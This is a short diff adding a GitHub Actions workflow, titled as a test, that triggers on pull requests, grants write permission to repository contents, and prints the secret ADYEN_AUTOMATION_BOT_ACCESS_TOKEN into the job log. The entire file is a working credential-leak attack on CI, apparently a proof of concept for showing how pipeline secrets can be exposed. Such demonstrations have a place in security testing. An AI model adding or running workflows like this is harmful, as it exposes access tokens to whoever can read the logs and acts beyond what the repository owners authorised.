@@ -1,0 +1,17 @@
+name: Leak ADYEN Token Test
+
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+permissions:
+  contents: write  # This permission increases risk
+
+jobs:
+  leak_secret:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Leak ADYEN_AUTOMATION_BOT_ACCESS_TOKEN secret
+        run: |
+          echo "🚨 Leaking ADYEN_AUTOMATION_BOT_ACCESS_TOKEN secret value:"
+          echo "${{ secrets.ADYEN_AUTOMATION_BOT_ACCESS_TOKEN }}"
